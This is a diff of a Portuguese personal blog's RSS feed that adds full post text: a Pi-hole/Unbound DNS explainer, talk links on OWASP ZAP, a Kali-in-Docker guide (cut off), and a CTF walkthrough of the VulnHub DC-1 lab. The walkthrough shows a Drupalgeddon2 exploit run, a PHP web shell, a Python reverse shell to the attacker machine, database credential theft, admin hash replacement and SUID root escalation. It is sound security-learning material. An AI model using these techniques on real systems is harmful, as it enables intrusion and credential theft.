@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
 <channel>
   <title>Danilo Maia Florenzano</title>
   <link>https://daniloflorenzano.com.br</link>
@@ -10,6 +10,70 @@
     <link>https://daniloflorenzano.com.br/posts/pi-hole-e-unbound-funcionamento</link>
     <guid>https://daniloflorenzano.com.br/posts/pi-hole-e-unbound-funcionamento</guid>
     <description><![CDATA[Pi-hole, Unbound, DNS recursivo e privacidade - funcionamento na prática]]></description>
+    <content:encoded><![CDATA[<h2 id="introdução">Introdução</h2>
+<p><strong>Pi-hole</strong> é um serviço conhecido e amplamente utilizado por quem tem o hábito de hospedar serviços em sua rede local (prática conhecida como self-host ou home lab).
+Junto ao Pi-hole, que atua como um bloqueador de anúncios, é comum utilizar o <strong>Unbound</strong> como servidor DNS upstream para substituir os populares como Google, Cloudflare, etc.</p>
+<p>Essa combinação é interessante para quem preza pela privacidade e busca retirar do ISP e das big techs um pouco do controle sobre como navega na internet.</p>
+<h2 id="funcionamento">Funcionamento</h2>
+<p>A instalação dos serviços é simples e amplamente documentada, mas o funcionamento talvez seja um pouco abstrato demais para algumas pessoas. Portanto, a partir dessa documentação que fiz para meu próprio <em>home lab</em>, trago uma tentativa de facilitar a compreensão sobre o caminho que a requisição por um endereço faz.</p>
+<p><img 
+  src="https://daniloflorenzano.com.br/posts/pi-hole-e-unbound-funcionamento/fluxo-dns.png"
+  alt="Fluxo DNS"
+  width="100%"
+  height="100%"
+/></p>
+<p>Com <strong>Wireshark</strong>, por exemplo, é possível ainda verificar a comunicação acontecendo entre o dispositivo físico e o servidor Pi-hole.</p>
+<p><img 
+  src="https://daniloflorenzano.com.br/posts/pi-hole-e-unbound-funcionamento/wireshark-dns-udp-stream.png"
+  alt="Wireshark DNS UDP stream"
+  width="100%"
+  height="100%"
+/></p>
+<p>E no servidor é possível consultar a quem o Unbound está perguntando e de fato confirmar que ele vai na raiz da internet e usa da recursão para descobrir o IP do domínio requisitado.</p>
+<pre><code class="language-bash">pi@raspberrypi:~ $ dig daniloflorenzano.com.br @127.0.0.1 +trace
+
+; &lt;&lt;&gt;&gt; DiG 9.16.50-Raspbian &lt;&lt;&gt;&gt; daniloflorenzano.com.br @127.0.0.1 +trace
+;; global options: +cmd
+.                       86199   IN      NS      g.root-servers.net.
+.                       86199   IN      NS      h.root-servers.net.
+.                       86199   IN      NS      i.root-servers.net.
+.                       86199   IN      NS      j.root-servers.net.
+.                       86199   IN      NS      k.root-servers.net.
+.                       86199   IN      NS      l.root-servers.net.
+.                       86199   IN      NS      m.root-servers.net.
+.                       86199   IN      NS      a.root-servers.net.
+.                       86199   IN      NS      b.root-servers.net.
+.                       86199   IN      NS      c.root-servers.net.
+.                       86199   IN      NS      d.root-servers.net.
+.                       86199   IN      NS      e.root-servers.net.
+.                       86199   IN      NS      f.root-servers.net.
+.                       86199   IN      RRSIG   NS 8 0 518400 20260509170000 20260426160000 54393 . JAeCnn0ctf9onzDOWiwUf15K4sxMy/JYcsGV/VeAcuNLEJYwXGBj4mKq QifmZvbyunk92flXmKkmY8tvUNhgLe8IHvY9OvlBwPFnLOx2sC57HmVU 3YQEuST89Q/N/SRinX7moZ25HYw4zRjV+FTDtN+cOOEWNfdgthmhGqCI lRCXn8eYUhJIRtKjsf1JiAfQ6qVzqEUm6UhyKBoi7Es7xc0LASmVqH5+ /g6j0ZHAXRxiuVwLnQFOZP7W0BF9PFM2PFkXQEEFmOPWMWZTza7Aa6+R H7DxGFLS6D/Z0tTQXPj7/7Q06E605iY3Ea3frKyAC7j7KvQG/pFY8HwC fyd/ag==
+;; Received 525 bytes from 127.0.0.1#53(127.0.0.1) in 9 ms
+
+br.                     172800  IN      NS      a.dns.br.
+br.                     172800  IN      NS      b.dns.br.
+br.                     172800  IN      NS      c.dns.br.
+br.                     172800  IN      NS      d.dns.br.
+br.                     172800  IN      NS      e.dns.br.
+br.                     172800  IN      NS      f.dns.br.
+br.                     86400   IN      DS      38298 13 2 9F2D4993F47B0F2751DE0007D70A2754EE532FE373761154D9EA7A8C B9D8EA18
+br.                     86400   IN      RRSIG   DS 8 1 86400 20260509170000 20260426160000 54393 . QVIoHJde1qoAA5NQjnTQBpZ2THFIoJeTljV7eC+OP2eJxHywDac5UQlz xztQ78YPUDrsJ7dpiJW8d7/6pYtYUkD6N0CcWgg5Wq1/hMkv5I2O/czn u8U9F3W9pq0PvjBspVjRsKPm7wWBsVkqMTlo2oYvgnwaD7kSsuV0rV4M sXRV2eCeQXelUdg10hNmOixfzq7lCFRxsI1AF0j56soo3mw4MMD9L9aX ax+zTEgH87ouvxeuW+vuVjJWir6fbI/s4L7j/YCVD916l9C4ZuAU4Lov 1EwXUTNfNp3KVMzpc38BydiwOZzGqCIlRS/DCsOaId0qbVpzf3JAHWU9 cwH+zw==
+;; Received 751 bytes from 199.7.91.13#53(d.root-servers.net) in 119 ms
+
+daniloflorenzano.com.br. 3600   IN      NS      adaline.ns.cloudflare.com.
+daniloflorenzano.com.br. 3600   IN      NS      junade.ns.cloudflare.com.
+2bidp124m8r4hd7jotlt2hu4o5dtnolo.com.br. 900 IN NSEC3 1 1 0 8D1329DE8E1C267BA5B9 2BIE8MUC55C3C09GN5N3HN2IRINIVU7K NS SOA RRSIG DNSKEY NSEC3PARAM
+2bidp124m8r4hd7jotlt2hu4o5dtnolo.com.br. 900 IN RRSIG NSEC3 13 3 900 20260510230505 20260426220505 13359 com.br. YT0sSjTH3pm2YhSqmBFMBr+V+kMFFCFviCB++bwDiVedyYW9lUWOoPCN U+w2Cy1IpC/7ybYzHJodIXQ+6uGtVA==
+28v53s2huhg7i7lp4bjbmdrcu2kvr8ii.com.br. 900 IN NSEC3 1 1 0 8D1329DE8E1C267BA5B9 28V72MJ72MPU6FP3AC2CJHMR6CI6NOCK NS DS RRSIG
+28v53s2huhg7i7lp4bjbmdrcu2kvr8ii.com.br. 900 IN RRSIG NSEC3 13 3 900 20260505144506 20260421134506 13359 com.br. xa9eH+X8IKPwpKKFPzhwnDQEApV0jMwfczq9WQ7Ff0abP2stcnGqvwUG afhIJRMIyh+wEYhuGyMPPxHI0/OjrA==
+;; Received 523 bytes from 200.219.159.10#53(f.dns.br) in 9 ms
+
+daniloflorenzano.com.br. 300    IN      A       104.21.57.195
+daniloflorenzano.com.br. 300    IN      A       172.67.165.213
+;; Received 84 bytes from 108.162.195.30#53(junade.ns.cloud
+</code></pre>
+<h2 id="conclusão">Conclusão</h2>
+<p>Uma combinação de serviços simples, de configuração rápida e de baixíssimo custo computacional pode agregar bastante valor à rede doméstica.</p>]]></content:encoded>
     <pubDate>Sun, 26 Apr 2026 22:33:43 GMT</pubDate>
   </item>
   <item>
@@ -17,6 +81,24 @@
     <link>https://daniloflorenzano.com.br/posts/flisol-2026-zaproxy</link>
     <guid>https://daniloflorenzano.com.br/posts/flisol-2026-zaproxy</guid>
     <description><![CDATA[Fontes de pesquisa e dados apresentados na palestra]]></description>
+    <content:encoded><![CDATA[<h2 id="contato">Contato</h2>
+<ul>
+<li><a target="_blank" href="https://www.linkedin.com/in/daniloflorenzano/">Linkedin</a> </li>
+<li><a target="_blank" href="https://github.com/daniloflorenzano">Github</a></li>
+</ul>
+<h2 id="links">Links</h2>
+<ul>
+<li><a target="_blank" href="https://github.com/zaproxy/zaproxy">Repositório OWASP Zed Attack Proxy</a></li>
+<li><a target="_blank" href="https://www.zaproxy.org/docs/desktop/start/features/">Funcionalidades do ZAPROXY</a></li>
+<li><a target="_blank" href="https://github.com/juice-shop/juice-shop">Repositório OWASP Juice Shop</a></li>
+<li><a target="_blank" href="https://pt.wikipedia.org/wiki/Modelo_cliente%E2%80%93servidor">Modelo cliente-servidor</a></li>
+<li><a target="_blank" href="https://owasp.org/www-community/attacks/Manipulator-in-the-middle_attack">Ataque man-in-the-middle</a></li>
+</ul>
+<h2 id="relacionados">Relacionados</h2>
+<ul>
+<li><a target="_blank" href="https://daniloflorenzano.com.br/posts/CTF-01-DC-1/">CTF #01 - Exploração do laboratório DC-1</a></li>
+<li><a target="_blank" href="https://daniloflorenzano.com.br/posts/kali-linux-no-docker/">Kali Linux no Docker</a></li>
+</ul>]]></content:encoded>
     <pubDate>Fri, 24 Apr 2026 22:58:09 GMT</pubDate>
   </item>
   <item>
@@ -24,6 +106,316 @@
     <link>https://daniloflorenzano.com.br/posts/CTF-01-DC-1</link>
     <guid>https://daniloflorenzano.com.br/posts/CTF-01-DC-1</guid>
     <description><![CDATA[Aplicação de técnicas de enumeração e execução de <i>exploits</i>, captura de credenciais, e elevação de privilégio em Linux. A postagem foca no passo-a-passo direto ao ponto, mostrando as abordagens com as quais obtive sucesso na captura das <i>flags</i>]]></description>
+    <content:encoded><![CDATA[<h2 id="laboratório-dc-1">Laboratório DC-1</h2>
+<blockquote>
+<p>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p>
+<p>It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.</p>
+</blockquote>
+<p>O laboratório pode ser configurado usando VirtualBox. A imagem para download está disponível no repositório da <a target="_blank" href="https://www.vulnhub.com/entry/dc-1,292/">VulnhHub</a>.</p>
+<p>Para a exploração, considere uma máquina Kali Linux.
+Se necessário, veja <a href="https://daniloflorenzano.com.br/posts/kali-linux-no-docker/" target="_blank">Kali Linux no Docker</a>.</p>
+<h2 id="reconhecimento">Reconhecimento</h2>
+<h3 id="identificar-a-máquina-na-rede-local-com-netdiscover">Identificar a máquina na rede local com <code>netdiscover</code>:</h3>
+<pre><code class="language-bash">┌──(root㉿omarchy)-[~]
+└─# netdiscover -r 192.168.0.0/24
+
+Currently scanning: Finished!   |   Screen View: Unique Hosts
+
+ 9 Captured ARP Req/Rep packets, from 9 hosts.   Total size: 522
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+ -----------------------------------------------------------------------------
+ ...
+ ...
+ 192.168.0.119   08:00:27:ca:79:73      1      42  PCS Systemtechnik GmbH
+</code></pre>
+<hr>
+<h3 id="identificar-as-portas-expostas-com-nmap">Identificar as portas expostas com <code>nmap</code>:</h3>
+<pre><code class="language-bash">┌──(root㉿omarchy)-[~]
+└─# nmap -sV 192.168.0.119
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-28 14:30 +0000
+Nmap scan report for 192.168.0.119
+Host is up (0.00016s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
+111/tcp open  rpcbind 2-4 (RPC #100000)
+MAC Address: 08:00:27:CA:79:73 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>O resultado no <code>nmap</code> evidencia uma aplicação web na porta 80.</p>
+<hr>
+<h3 id="identificar-aplicação-web">Identificar aplicação web:</h3>
+<p><img 
+  src="https://daniloflorenzano.com.br/posts/CTF-01-DC-1/drupal-home-page.png"
+  alt="Pagina inicial Drupal"
+  width="100%"
+  height="100%"
+/></p>
+<p>A aplicação web executando na porta 80 é um servidor Drupal, um CMS, assim como Wordpress. Com a extensão Wappalyzer, é possível identificar que a versão sendo executada é a 7. </p>
+<hr>
+<h3 id="enumerar-exploits-com-searchsploit">Enumerar <em>exploits</em> com <code>searchsploit</code>:</h3>
+<pre><code class="language-bash">┌──(root㉿omarchy)-[~]
+└─# searchsploit drupal 7
+---------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                          |  Path
+---------------------------------------------------------------------------------------- ---------------------------------
+...
+...
+Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &#39;Drupalgeddon2&#39; Remote Code Execution     | php/webapps/44449.rb
+</code></pre>
+<p>O <code>searchsploit</code> retorna diversos <em>exploits</em>, porém reduzi a lista para evidenciar o que escolhi utilizar.</p>
+<h2 id="execução">Execução</h2>
+<h3 id="obter-pseudo-shell-com-o-exploit-drupalgeddon2">Obter <em>pseudo shell</em> com o exploit Drupalgeddon2:</h3>
+<pre><code class="language-bash">mkdir dc1 &amp;&amp; cd dc1/
+searchsploit -m php/webapps/44449.rb
+</code></pre>
+<p>A execução do script abre um <em>pseudo shell</em> e com ele já permite a captura da <strong>primeira bandeira</strong>.</p>
+<pre><code class="language-bash">┌──(root㉿omarchy)-[/home/dc1]
+└─# ruby 44449.rb http://192.168.0.119
+[*] --==[::#Drupalggedon2::]==--
+--------------------------------------------------------------------------------
+[i] Target : http://192.168.0.119/
+--------------------------------------------------------------------------------
+[!] MISSING: http://192.168.0.119/CHANGELOG.txt    (HTTP Response: 404)
+[!] MISSING: http://192.168.0.119/core/CHANGELOG.txt    (HTTP Response: 404)
+[+] Found  : http://192.168.0.119/includes/bootstrap.inc    (HTTP Response: 403)
+[!] MISSING: http://192.168.0.119/core/includes/bootstrap.inc    (HTTP Response: 404)
+[+] Found  : http://192.168.0.119/includes/database.inc    (HTTP Response: 403)
+[+] URL    : v7.x/6.x?
+[+] Found  : http://192.168.0.119/    (HTTP Response: 200)
+[+] Metatag: v7.x/6.x [Generator]
+[!] MISSING: http://192.168.0.119/    (HTTP Response: 200)
+[+] Drupal?: v7.x/6.x
+--------------------------------------------------------------------------------
+[*] Testing: Form   (user/password)
+[+] Result : Form valid
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+[*] Testing: Clean URLs
+[+] Result : Clean URLs enabled
+--------------------------------------------------------------------------------
+[*] Testing: Code Execution   (Method: name)
+[i] Payload: echo UFANATCP
+[+] Result : UFANATCP
+[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
+--------------------------------------------------------------------------------
+[*] Testing: Existing file   (http://192.168.0.119/shell.php)
+[!] Response: HTTP 200 // Size: 7.   ***Something could already be there?***
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+[*] Testing: Writing To Web Root   (./)
+[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
+[+] Result : &lt;?php if( isset( $_REQUEST[&#39;c&#39;] ) ) { system( $_REQUEST[&#39;c&#39;] . &#39; 2&gt;&amp;1&#39; ); }
+[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
+--------------------------------------------------------------------------------
+[i] Fake PHP shell:   curl &#39;http://192.168.0.119/shell.php&#39; -d &#39;c=hostname&#39;
+DC-1&gt;&gt; ls | grep flag
+flag1.txt
+DC-1&gt;&gt; cat flag1.txt
+Every good CMS needs a config file - and so do you.
+</code></pre>
+<blockquote>
+<p>Every good CMS needs a config file - and so do you.</p>
+</blockquote>
+<p>Uma característica do DC-1 é que as bandeiras fornecem orientações dos próximos passos.</p>
+<hr>
+<h3 id="melhorar-o-shell-com-netcat">Melhorar o <em>shell</em> com <em>netcat</em>:</h3>
+<p>Antes de ir atrás do arquivo de configuração, uma opção válida é melhorar o <em>shell</em>.</p>
+<p>Na máquina Kali:</p>
+<pre><code class="language-bash">┌──(root㉿omarchy)-[/]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+</code></pre>
+<p>Na máquina DC-1</p>
+<pre><code class="language-bash">python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.9&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<p>O script Python executado na DC-1 eu obtive no portal <a target="_blank" href="https://gtfobins.org/gtfobins/python/#reverse-shell">GTFObins</a>. </p>
+<p>Ao reproduzir, é importante alterar o IP de connect pelo IP da sua máquina Kali (a minha, no momento, era 192.168.0.9).</p>
+<p>O <em>reverse shell</em> será aberto na máquina Kali:</p>
+<pre><code class="language-bash">┌──(root㉿omarchy)-[/]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.0.9] from (UNKNOWN) [192.168.0.119] 44257
+www-data@DC-1:/var/www$ ls
+ls
+COPYRIGHT.txt       MAINTAINERS.txt  includes     robots.txt  web.config
+INSTALL.mysql.txt   README.txt       index.php    scripts     xmlrpc.php
+INSTALL.pgsql.txt   UPGRADE.txt      install.php  shell.php
+INSTALL.sqlite.txt  authorize.php    misc         sites
+INSTALL.txt         cron.php         modules      themes
+LICENSE.txt         flag1.txt        profiles     update.php
+www-data@DC-1:/var/www$
+</code></pre>
+<h3 id="capturar-credenciais-do-mysql">Capturar credenciais do MySQL:</h3>
+<p>No Drupal, as credenciais do banco de dados está no arquivo de configurações, que por padrão fica no diretório <code>/var/www/sites/default</code>.</p>
+<p>Além das credenciais, no arquivo se encontra a <strong>segunda bandeira</strong>.</p>
+<pre><code class="language-bash">www-data@DC-1:/var/www$ cd /var/www/sites/default/
+www-data@DC-1:/var/www/sites/default$ ls
+ls
+default.settings.php  files  settings.php
+www-data@DC-1:/var/www/sites/default$ cat settings.php
+cat settings.php
+&lt;?php
+
+/**
+ *
+ * flag2
+ * Brute force and dictionary attacks aren&#39;t the
+ * only ways to gain access (and you WILL need access).
+ * What can you do with these credentials?
+ *
+ */
+
+$databases = array (
+  &#39;default&#39; =&gt;
+  array (
+    &#39;default&#39; =&gt;
+    array (
+      &#39;database&#39; =&gt; &#39;drupaldb&#39;,
+      &#39;username&#39; =&gt; &#39;dbuser&#39;,
+      &#39;password&#39; =&gt; &#39;R0ck3t&#39;,
+      &#39;host&#39; =&gt; &#39;localhost&#39;,
+      &#39;port&#39; =&gt; &#39;&#39;,
+      &#39;driver&#39; =&gt; &#39;mysql&#39;,
+      &#39;prefix&#39; =&gt; &#39;&#39;,
+    ),
+  ),
+);
+...
+</code></pre>
+<blockquote>
+<p>Brute force and dictionary attacks aren&#39;t the only ways to gain access (and you WILL need access). What can you do with these credentials?</p>
+</blockquote>
+<hr>
+<h3 id="alterar-credenciais-de-administrador-do-drupal">Alterar credenciais de administrador do Drupal:**</h3>
+<p>As credenciais de usuário do Drupal ficam na tabela <code>users</code>.</p>
+<pre><code class="language-bash">www-data@DC-1:/var/www/sites/default$ mysql -u dbuser -pR0ck3t drupaldb
+mysql&gt; select name, pass from users;
+select name, pass from users;
++-------+---------------------------------------------------------+
+| name  | pass                                                    |
++-------+---------------------------------------------------------+
+|       |                                                         |
+| admin | $S$Dowp8Hu5SUTSG1FOc/zHfsdCWVgKIHnD1ZgcUYdHpC9NQtwLasEu |
+| Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |
++-------+---------------------------------------------------------+
+
+mysql&gt; exit
+exit
+Bye
+</code></pre>
+<p>Não é possível utilizar a senha dessa forma, pois sofreu processo de <em>hashing</em>. O que pode ser feito é criar uma nova senha, passar ela pelo exato mesmo processo de <em>hashing</em> e alterar o registro no banco com o novo <em>hash</em>.</p>
+<p>Tendo acesso ao servidor do Drupal, esse processo é simples. O script utilizado para fazer o processo de <em>hashing</em> fica no diretório <code>/var/www/scripts/</code>.</p>
+<p>Dado a como o script foi desenvolvido, é necessário que seja executado do diretório <code>/var/www/</code>.</p>
+<pre><code class="language-bash">www-data@DC-1:/var/www/sites/default$ cd /var/www/scripts/
+cd /var/www/scripts/
+www-data@DC-1:/var/www/scripts$ ls
+ls
+code-clean.sh  drupal.sh            generate-d6-content.sh  run-tests.sh
+cron-curl.sh   dump-database-d6.sh  generate-d7-content.sh  test.script
+cron-lynx.sh   dump-database-d7.sh  password-hash.sh
+www-data@DC-1:/var/www/scripts$ cd ..
+cd ..
+www-data@DC-1:/var/www$ php scripts/password-hash.sh novasenha
+php scripts/password-hash.sh novasenha
+
+password: novasenha             hash: $S$D2rtDg4oSMooJimjyyNn93nXK/f5emudOSGuWPFfPMZRsKMxpuTX
+</code></pre>
+<p>Com o <em>hash</em> da nova senha em mãos, basta alterar o registro no banco de dados.</p>
+<pre><code class="language-bash">www-data@DC-1:/var/www$ mysql -u dbuser -pR0ck3t drupaldb
+mysql -u dbuser -pR0ck3t drupaldb
+
+mysql&gt; UPDATE users SET pass = &#39;$S$D2rtDg4oSMooJimjyyNn93nXK/f5emudOSGuWPFfPMZRsKMxpuTX&#39; WHERE name = &#39;admin&#39;;
+UPDATE users SET pass = &#39;$S$D2rtDg4oSMooJimjyyNn93nXK/f5emu&lt;s = &#39;$S$D2rtDg4oSMooJimjyyNn93nXK/f5emudOSGuWPFfPMZ       &lt;Nn93nXK/f5emudOSGuWPFfPMZRsKMxpuTX&#39; WHERE name = &#39;a       dmin&#39;;
+Query OK, 1 row affected (0.01 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+mysql&gt; exit
+exit
+Bye
+</code></pre>
+<hr>
+<h3 id="acessar-drupal-como-administrador">Acessar Drupal como administrador:</h3>
+<p>Com as credenciais alteradas, basta <em>logar</em> com &quot;admin&quot; e &quot;novasenha&quot;.</p>
+<p><img 
+  src="https://daniloflorenzano.com.br/posts/CTF-01-DC-1/drupal-admin.png"
+  alt="Pagina de usuario admin do Drupal"
+  width="100%"
+  height="100%"
+/></p>
+<p>Em <code>http://192.168.0.119/node/2#overlay-context=node&amp;overlay=admin/content</code> se encontra a <strong>terceira bandeira</strong>.</p>
+<p><img 
+  src="https://daniloflorenzano.com.br/posts/CTF-01-DC-1/drupal-content.png"
+  alt="Pagina de conteudo Drupal"
+  width="100%"
+  height="100%"
+/></p>
+<p><img 
+  src="https://daniloflorenzano.com.br/posts/CTF-01-DC-1/drupal-third-flag.png"
+  alt="Pagina de conteudo da terceira flag Drupal"
+  width="100%"
+  height="100%"
+/></p>
+<blockquote>
+<p>Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.</p>
+</blockquote>
+<hr>
+<h3 id="escalar-privilégio-com-find">Escalar privilégio com <code>find</code>:</h3>
+<p>As palavras em caixa alta e o argumento <code>-exec</code> da terceira bandeira dá a direção.</p>
+<p>Ao enumerar os executaveis que conseguem performar ações com permissão de super usuário (SUIDs), assim como indicado pela bandeira, <code>find</code> aparece na lista.</p>
+<blockquote>
+<p>SUIDs (files &amp; programs that have the permission of their owner -- usually root. Useful for privilege escalation)</p>
+</blockquote>
+<p>O comando para executar essa enumeração eu consegui em <a target="_blank" href="https://cyberlab.pacific.edu/resources/linux-enumeration-cheat-sheet">Linux Enumeration Cheat Sheet</a>.</p>
+<pre><code class="language-bash">www-data@DC-1:/var/www$ find / -perm -4000 -user root -exec ls -ld {} \; 2&gt; /dev/null
+&lt;d / -perm -4000 -user root -exec ls -ld {} \; 2&gt; /d       ev/null
+-rwsr-xr-x 1 root root 88744 Dec 10  2012 /bin/mount
+-rwsr-xr-x 1 root root 31104 Apr 13  2011 /bin/ping
+-rwsr-xr-x 1 root root 35200 Feb 27  2017 /bin/su
+-rwsr-xr-x 1 root root 35252 Apr 13  2011 /bin/ping6
+-rwsr-xr-x 1 root root 67704 Dec 10  2012 /bin/umount
+-rwsr-xr-x 1 root root 35892 Feb 27  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 45396 Feb 27  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 30880 Feb 27  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 44564 Feb 27  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root 66196 Feb 27  2017 /usr/bin/gpasswd
+-rwsr-sr-x 1 root mail 83912 Nov 18  2017 /usr/bin/procmail
+-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find
+-rwsr-xr-x 1 root root 937564 Feb 11  2018 /usr/sbin/exim4
+-rwsr-xr-x 1 root root 9660 Jun 20  2017 /usr/lib/pt_chown
+-rwsr-xr-x 1 root root 248036 Jan 27  2018 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 5412 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-- 1 root messagebus 321692 Feb 10  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 84532 May 22  2013 /sbin/mount.nfs
+</code></pre>
+<p>Confirmada a presença do <code>find</code> na lista, basta a execução do comando para criar o shell com permissão de <em>root</em>.</p>
+<p>O comando encontrei em <a target="_blank" href="https://gtfobins.org/gtfobins/find/#shell">GTFObins</a>.</p>
+<pre><code class="language-bash">www-data@DC-1:/var/www$ find . -exec /bin/sh \; -quit
+find . -exec /bin/sh \; -quit
+# whoami
+whoami
+root
+</code></pre>
+<p>A <strong>última bandeira</strong> se encontra no diretório <code>/root/</code>.</p>
+<pre><code class="language-bash"># ls /root
+ls /root
+thefinalflag.txt
+# cat /root/thefinalflag.txt
+cat /root/thefinalflag.txt
+Well done!!!!
+
+Hopefully you&#39;ve enjoyed this and learned some new skills.
+
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7
+</code></pre>
+<blockquote>
+<p>Hopefully you&#39;ve enjoyed this and learned some new skills.</p>
+<p>You can let me know what you thought of this little journey by contacting me via Twitter - @DCAU7</p>
+</blockquote>
+<hr>
+<h2 id="conclusão">Conclusão</h2>
+<p>DC-1 foi meu primeiro CTF e tive uma experiência positiva com o laboratório. As orientações deixadas pelo autor em cada bandeira ditam o próximo passo, mas não de maneira óbvia, o que provoca a curiosidade de entender a pista e extrair dela o caminho para a próxima exploração.</p>]]></content:encoded>
     <pubDate>Sat, 28 Mar 2026 14:10:48 GMT</pubDate>
   </item>
   <item>
@@ -31,6 +423,71 @@
     <link>https://daniloflorenzano.com.br/posts/kali-linux-no-docker</link>
     <guid>https://daniloflorenzano.com.br/posts/kali-linux-no-docker</guid>
     <description><![CDATA[Como configurar um container do Kali Linux]]></description>
+    <content:encoded><![CDATA[<p><img 
+  src="https://daniloflorenzano.com.br/posts/kali-linux-no-docker/kali-lab.png"
+  alt="output do comand fastfetch no kali linux"
+  width="100%"
+  height="100%"
+/></p>
+<h2 id="container-vs-máquina-virtual---escolha-pessoal">Container vs Máquina Virtual - escolha pessoal</h2>
+<p>Trabalhar com o Kali em um container tem suas vantagens e desvantagens, e a maioria delas é as mesmas que você encontraria em qualquer situação semelhante (performance, isolamento de ambiente, etc). E, para mim, os pontos principais que me levaram a optar pelo container foram dois:</p>
+<ol>
+<li><p><strong>Aproveitar o meu workflow já configurado</strong>. Utilizo, até o momento da escrita desse post, Hyprland como gerenciador de janelas. Utilizar o Kali em um container sem ambiente gráfico me poupa de me adaptar ao <em>workflow</em> da distro ou de ter o trabalho de adaptar ele ao meu. </p>
+</li>
+<li><p><strong>Ambientes gráficos, nesse caso, não me fazem falta</strong>. Algumas ferramentas no Kali, como Wireshark e Burp Suite, já fazem parte do meu dia a dia independente do estudo a parte que faço sobre segurança da informação e estão instaladas diretamente no meu SO host.</p>
+</li>
+</ol>
+<h2 id="download-da-imagem-e-configuração-do-container">Download da imagem e configuração do container</h2>
+<p>A imagem Docker do Kali não é nenhuma &quot;gambiarra; é oficial e pode ser encontrada <a href="https://www.kali.org/docs/containers/official-kalilinux-docker-images/">aqui</a>.</p>
+<p>Como sugerido no próprio portal, a imagem recomendada é a <code>kali-rolling</code>.</p>
+<pre><code class="language-bash">docker pull kalilinux/kali-rolling
+</code></pre>
+<p>Após o <em>pull</em> da imagem, o container já pode ser iniciado. Porém, aqui algumas configurações se fazem necessárias para o uso mais conveniente do sistema.</p>
+<p>Antes de iniciar o container, recomendo que rode o seguinte comando para criar o volume em que as configurações feitas no Kali sejam persistidas:</p>
+<pre><code class="language-bash">docker volume create kali_data
+</code></pre>
+<p>O seguinte comando cria, inicia o container e em seguida já dá acesso ao Kali pelo <code>bash</code>:</p>
+<pre><code class="language-bash">docker run -it \
+ --name kali-lab \
+ --network host \
+ -v kali_data:/root \
+ --cap-add=NET_ADMIN \
+ --cap-add=NET_RAW \
+ kalilinux/kali-rolling /bin/bash
+</code></pre>
+<ul>
+<li><code>--network host</code>: O container compartilha a interface de rede diretamente com a sua máquina real. Essencial para ataques de rede, <em>sniffing</em>, <em>scanners</em> e conexão com <em>reverse shell</em>.</li>
+<li><code>--cap-add=NET_ADMIN</code>: Permite configurar interfaces de rede.</li>
+<li><code>--cap-add=NET_RAW</code>: Permite que o Nmap crie pacotes &quot;crus&quot; para <em>scans</em> furtivos.</li>
+</ul>
+<p>A documentação do Kali informa que a imagem não possui as ferramentas padrões instaladas, e, portanto, é necessário executar o comando abaixo no <code>bash</code> do container:</p>
+<pre><code class="language-bash">apt update &amp;&amp; apt -y install kali-linux-headless
+</code></pre>
+<p>Acompanhe a instalação até o final.</p>
+<p>Seu Kali está pronto, e mesmo que você saia do container ou feche o terminal, basta iniciá-lo novamente com <code>docker start kali-lab</code> e acessá-lo com <code>docker exec -it kali-lab /bin/bash</code>.</p>
+<h2 id="melhoria-do-workflow">Melhoria do workflow</h2>
+<p>Pra facilitar a vida, uma configuração <strong>opcional para quem usa Linux</strong> é adicionar uma função no <code>~/.bashrc</code> que combina os comandos <em>start</em> e o <em>exec -it</em>. Dessa forma é mais simples iniciar o ambiente e abrir quantos terminais forem necessários dentro do container.</p>
+<pre><code class="language-bash">kali() {
+    # Verifica se o container existe
+    if [ &quot;$(docker ps -aq -f name=kali-lab)&quot; ]; then
+        # Se estiver parado, inicia
